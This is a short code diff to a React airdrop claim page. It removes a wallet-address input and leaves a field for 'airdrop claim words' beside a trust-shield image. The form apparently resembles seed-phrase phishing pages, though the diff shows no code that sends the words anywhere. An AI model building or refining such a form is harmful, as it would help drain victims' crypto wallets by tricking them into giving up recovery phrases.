@@ -7,7 +7,6 @@ import trustShield from '../../assets/trust-shield.png'
 function AirdropPage() {
   const navigate = useNavigate()
   const [claimWords, setClaimWords] = useState('')
-  const [walletAddress, setWalletAddress] = useState('')
   const [showRedeemModal, setShowRedeemModal] = useState(false)
   const [isRedeeming, setIsRedeeming] = useState(false)
 
@@ -45,17 +44,6 @@ function AirdropPage() {
         </section>
 
         <form className="claim-form" onSubmit={(event) => event.preventDefault()}>
-          <label className="claim-field">
-            <span>Wallet address</span>
-            <input
-              type="text"
-              value={walletAddress}
-              onChange={(event) => setWalletAddress(event.target.value)}
-              placeholder="0x... or wallet address"
-              autoComplete="off"
-            />
-          </label>
-
           <label className="claim-field">
             <span>Airdrop claim words</span>
             <div className="claim-words-box">
